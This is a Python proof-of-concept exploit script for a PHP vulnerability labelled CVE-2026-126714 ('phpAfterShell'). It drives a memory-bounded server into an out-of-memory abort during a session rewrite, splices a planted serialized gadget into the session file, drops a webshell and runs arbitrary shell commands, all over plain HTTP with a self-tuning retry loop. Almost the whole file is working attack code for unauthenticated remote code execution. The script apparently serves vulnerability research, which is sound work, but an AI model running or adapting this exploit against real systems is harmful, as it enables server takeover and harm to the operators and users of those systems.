#!/usr/bin/env python3
"""
100% remote (HTTP-only) exploit chain for CVE-2026-126714 (phpAfterShell).

Everything travels over plain HTTP to the target - no docker, no cgroup
access, no local file system access. The interrupted pwrite() is produced
the way a real remote attacker does it: by driving the target's own
memory-bounded cgroup (e.g. a container with mem_limit) to the edge with
held connections while the victim request is inside its session rewrite.

Chain:
  1. carrier upload-progress request (held)      -> progress record on disk
  2. ordinary POST stores the gadget payload     -> C = [progress][bio]
  3. filler connections (held, HTTP only)        -> memory pressure
  4. replacement upload-progress request         -> victim rewrites the session
     + burst push to the fillers at the right moment:
       - reclaim evicts C's re-read page cache
       - the victim's own pwrite() then charges the evicted pages,
         exceeds the cgroup limit and is aborted mid-write
       - inode keeps R[0:k] || C[k:]
  5. consumer GET -> session_start() promotes the planted bytes into a
     live FileCache object -> __destruct drops a webshell  -> RCE
  6. GET /s.php?c=<command>  -> command output

The interruption instant is tuned with a feedback loop driven by the
target's oracle endpoint (which reports the splice offset k).
"""
from __future__ import annotations

import json
import socket
import sys
import time
import urllib.parse

import lab

# --- geometry (same layout as lab; see README for the derivation) ---------
# Bigger than the local-controller sizes so the victim's RSS clearly
# exceeds the apache master's at the OOM moment (fillers can never be
# bigger than the master because post_max_size caps a request at 8 MiB).
N_FILLERS = 7
F_MAX = 7_000_000              # per-filler field bytes (body < post_max_size)
P_CARRIER_PROGRESS = 336       # carrier progress record length (fixed layout)
P_START = P_CARRIER_PROGRESS + len(b"bio|s:") + len(str(lab.L1)) + len(':"')
SHELL = lab.SHELL_URL_PATH


# ------------------------------------------------------------------ HTTP I/O

def _conn(host: str, port: int) -> socket.socket:
    return socket.create_connection((host, port), timeout=15)


def filler_open(host: str, port: int) -> list[socket.socket]:
    """Open held MULTIPART requests with a non-file field.

    The field value is buffered by PHP's RFC1867 parser in process memory
    (anonymous, unreclaimable) as the bytes arrive - that is what makes the
    pressure stick. An urlencoded body would instead be spooled to disk by
    Apache and become reclaimable file cache, which evaporates the moment
    the victim's serialization triggers reclaim.
    """
    socks = []
    b = lab.BOUNDARY
    for i in range(N_FILLERS):
        head = (
            f"POST /index.php HTTP/1.1\r\nHost: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={b}\r\n"
            f"Content-Length: {F_MAX + 256}\r\n"
            f"Connection: keep-alive\r\n\r\n"
            f"--{b}\r\n"
            f'Content-Disposition: form-data; name="f{i}"\r\n\r\n'
        ).encode()
        s = _conn(host, port)
        s.sendall(head)
        socks.append(s)
    return socks


def filler_push(socks: list[socket.socket], per_filler: int) -> int:
    """Send per_filler more bytes of the held field value to every filler,
    concurrently (the burst must land inside a ~10ms window)."""
    import concurrent.futures

    def push_one(s: socket.socket) -> int:
        sent = 0
        chunk = b"A" * 65536
        left = per_filler
        while left > 0:
            n = min(left, len(chunk))
            try:
                s.sendall(chunk[:n])
            except OSError:
                break
            sent += n
            left -= n
        return sent

    with concurrent.futures.ThreadPoolExecutor(max_workers=len(socks) or 1) as ex:
        return sum(ex.map(push_one, socks))


def victim_wait(s: socket.socket, timeout: float) -> tuple[str, float]:
    """Wait for the victim connection: eof / reset / timeout. Returns
    (event, elapsed_ms)."""
    t0 = time.monotonic()
    s.settimeout(timeout)
    try:
        while s.recv(65536):
            pass
        return "eof", (time.monotonic() - t0) * 1000
    except ConnectionResetError:
        return "rst", (time.monotonic() - t0) * 1000
    except socket.timeout:
        return "timeout", (time.monotonic() - t0) * 1000
    except OSError as e:
        return type(e).__name__, (time.monotonic() - t0) * 1000


def _dechunk(data: bytes) -> bytes:
    """Decode a Transfer-Encoding: chunked body (Apache uses it for CGI)."""
    out = b""
    i = 0
    while i < len(data):
        j = data.find(b"\r\n", i)
        if j < 0:
            break
        try:
            n = int(data[i:j], 16)
        except ValueError:
            return data
        if n == 0:
            break
        out += data[j + 2:j + 2 + n]
        i = j + 2 + n + 2
    return out or data


def http_get(host: str, port: int, path: str, sid: str | None = None,
             timeout: float = 15.0) -> bytes:
    extra = f"Cookie: PHPSESSID={sid}\r\n" if sid else ""
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n{extra}"
           f"Connection: close\r\n\r\n").encode()
    s = _conn(host, port)
    s.sendall(req)
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except (socket.timeout, OSError):
        pass
    s.close()
    if b"\r\n\r\n" not in data:
        return data
    head, _, body = data.partition(b"\r\n\r\n")
    if b"transfer-encoding: chunked" in head.lower():
        return _dechunk(body)
    return body


def oracle(host: str, port: int, sid: str) -> dict:
    body = http_get(host, port, "/index.php", sid=sid)
    start = body.find(b"{")
    if start < 0:
        return {"raw": body[:300].decode(errors="replace"),
                "dead": b"Failed to decode" not in body}
    try:
        rep = json.loads(body[start:])
    except json.JSONDecodeError:
        return {"raw": body[:300].decode(errors="replace")}
    rep["decode_failed"] = b"Failed to decode" in body
    return rep


# --------------------------------------------------------------- attempt

def build_payload() -> bytes:
    """Same plant as the local stages, for the remote geometry."""
    e_off = lab.e_offset()
    return lab.build_payload(P_START, e_off)


def classify(rep: dict, c_len: int, r_len: int) -> tuple[str, int | None]:
    if rep.get("dead"):
        # the consumer request itself failed (often an OOM under pressure);
        # retried after the fillers are released - not a server death.
        return "oracle-failed", None
    if "evil" in (rep.get("objects") or {}):
        return "hit", rep.get("gstart")
    size = rep.get("size", -1)
    if size >= r_len - 64:
        return "nooom", r_len              # pwrite completed: file = full R
    if size > c_len:
        return "extended", size            # k = size (overwrite not charged)
    if size == c_len:
        gstart, glen = rep.get("gstart"), rep.get("glen")
        if gstart is None:
            # no replacement filename in the file: either the untouched
            # carrier (early OOM before the write) or k < f
            if rep.get("flen") in (None, 4) or not rep.get("keys"):
                return "early", 0
            return "early-k", 0
        if glen is not None and glen < lab.LEN2:
            return "mix", gstart + glen
        return "late", None                 # k >= E', file still |C|
    gstart, glen = rep.get("gstart"), rep.get("glen")
    if gstart is not None and glen is not None:
        k = gstart + glen
        if glen < lab.LEN2:
            return "mix", k
        return "late", k
    return "unknown", None


def attempt(host: str, port: int, h: int, c_len: int, r_len: int) -> dict:
    """One full remote attempt with pre-loaded pressure.

    h bytes of filler pressure are charged BEFORE the victim request, so the
    used-memory curve is deterministic: the victim's own serialization
    crosses the cgroup limit at X = limit - baseline - h. Reclaim then
    evicts the (gc-cleared) page-cache pool - C's re-read pages - and the
    victim's pwrite() re-charges them until the remaining headroom runs out
    at k = limit - baseline - h - X_pwrite + evicted.
    """
    res = {"h": h}
    # pool hygiene: drop every stored session file so only this attempt's
    # C contributes page cache (missing endpoint = no-op on real targets).
    http_get(host, port, "/index.php?gc=1")

    sid = lab.sid_new()
    res["sid"] = sid

    # carrier with verification + retry (the progress record must exist
    # before the bio store, otherwise the record order - and with it the
    # whole splice geometry - is wrong).
    carrier = None
    for attempt_no in range(3):
        if carrier:
            try:
                carrier.close()
            except OSError:
                pass
        carrier, _ = lab.carrier_hold(sid)
        time.sleep(0.7)
        rep = oracle(host, port, sid)
        if any(str(k).startswith("upload_progress_")
               for k in (rep.get("keys") or [])):
            break
    else:
        res["outcome"] = "no-carrier"
        try:
            carrier.close()
        except OSError:
            pass
        return res

    lab.store_bio(sid, build_payload())
    time.sleep(0.3)

    fillers = filler_open(host, port)
    time.sleep(0.4)
    pushed = filler_push(fillers, h // N_FILLERS)
    res["pushed"] = pushed
    time.sleep(0.4)                 # let the charge settle before the victim

    victim, _ = lab.replacement_hold(sid)
    ev, drop_ms = victim_wait(victim, timeout=6.0)
    res["victim"] = ev
    res["drop_ms"] = round(drop_ms, 1)

    rep = oracle(host, port, sid)
    outcome, k = classify(rep, c_len, r_len)
    res["outcome"] = outcome
    res["k"] = k
    res["size"] = rep.get("size")

    hit = outcome == "hit"
    res["hit"] = hit
    if hit:
        cmd_out = http_get(host, port,
                           f"{SHELL}?c={urllib.parse.quote(res.get('cmd', 'id'))}")
        res["output"] = cmd_out.decode(errors="replace")

    # Release the pressure BEFORE reading the oracle: the consumer has to
    # read the (up to 16 MiB) session file and must not OOM on the way.
    # The victim/carrier stay open - aborting them would trigger PHP's
    # upload-progress cleanup, which rewrites the session and destroys the
    # mixed state before the oracle can observe it.
    for s in fillers:
        try:
            s.close()
        except OSError:
            pass
    rep2 = oracle(host, port, sid) if outcome == "oracle-failed" else rep
    if outcome == "oracle-failed":
        res["outcome"], k = classify(rep2, c_len, r_len)
        res["k"] = k
        res["hit"] = res["outcome"] == "hit"
        if res["hit"]:
            cmd_out = http_get(host, port, f"{SHELL}?c="
                               f"{urllib.parse.quote(res.get('cmd', 'id'))}")
            res["output"] = cmd_out.decode(errors="replace")

    for s in [carrier, victim]:
        try:
            s.close()
        except OSError:
            pass
    time.sleep(0.3)
    return res


# --------------------------------------------------------------- driver

def wait_server(host: str, port: int, timeout: float = 20.0) -> bool:
    t0 = time.monotonic()
    while time.monotonic() - t0 < timeout:
        try:
            s = socket.create_connection((host, port), timeout=2)
            s.close()
            return True
        except OSError:
            time.sleep(0.5)
    return False


def exploit(host: str, port: int, command: str, max_attempts: int = 40,
            verbose: bool = True) -> dict:
    lab.set_geometry("big")     # victim RSS must beat the apache master
    lab.HOST, lab.PORT = host, port
    c_len = P_START + lab.L1 + 2
    r_len = (len(lab.r_prefix()) + lab.LEN2 + len(lab.r_suffix())
             + lab.L1 + 17)
    if verbose:
        print(f"[*] target {host}:{port}  |C|={c_len} |R|={r_len} "
              f"window=[{lab.f_offset()}, {lab.e_offset()}) "
              f"k_target={lab.k_target()}")

    # Pre-loaded pressure H (anonymous, held in PHP's multipart parser).
    # With the bundled lab (limit 64m, baseline ~13m after gc) the victim's
    # own serialization crosses the limit at X = 51m - H; the window that
    # both keeps the apache master out of the OOM's reach (X >= 16m) and
    # lands k in the splice window is H in ~[30m, 38m].
    h = 22_000_000
    h_min, h_max = 10_000_000, 30_000_000
    step = 4_000_000           # damped: halved whenever the direction flips
    last_dir = 0

    for i in range(1, max_attempts + 1):
        if not wait_server(host, port):
            return {"error": "server unreachable"}
        res = attempt(host, port, h, c_len, r_len)
        res["cmd"] = command
        if res.get("hit"):
            if verbose:
                print(f"[+] RCE on attempt {i}: "
                      f"{res.get('output', '').strip()[:200]!r}")
            return res
        if verbose:
            print(f"    attempt {i}: {res}")

        out = res.get("outcome")
        k = res.get("k")
        if out == "nooom":
            delta = +step               # never crossed: more pressure
        elif k is not None:
            # k = const - h, so h += (k - k_target) moves k onto target
            delta = k - lab.k_target()
            delta = max(-step, min(step, delta))
        else:
            delta = +step // 2          # oracle hiccup: nudge upward

        d = 1 if delta > 0 else (-1 if delta < 0 else 0)
        if last_dir and d and d != last_dir:
            step = max(step // 2, 1_000_000)
        if d:
            last_dir = d
        h = max(h_min, min(h_max, h + delta))

    return {"error": "no hit within attempt budget"}


def main() -> int:
    import argparse
    p = argparse.ArgumentParser(
        prog="phpaftershell-poc",
        description="Unauthenticated RCE against CVE-2026-126714 "
                    "(phpAfterShell) over plain HTTP.",
        epilog="example:\n  phpaftershell-poc "
               "--target http://127.0.0.1:8087 --command 'id'\n",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--target", required=True,
                   help="base URL of the target, e.g. http://127.0.0.1:8087")
    p.add_argument("--command", required=True,
                   help="shell command to run on the target")
    p.add_argument("--attempts", type=int, default=25,
                   help="maximum interruption attempts (default 25)")
    p.add_argument("-q", "--quiet", action="store_true")
    a = p.parse_args()

    t = a.target.rstrip("/")
    if "://" not in t:
        t = "http://" + t
    hostport = t.split("://", 1)[1]
    host, _, port = hostport.partition(":")
    port = int(port or 80)

    res = exploit(host, port, a.command, a.attempts, verbose=not a.quiet)
    if res.get("error"):
        print(f"[!] {res['error']}")
        return 2
    print(res.get("output", "").strip())
    return 0


if __name__ == "__main__":
    sys.exit(main())
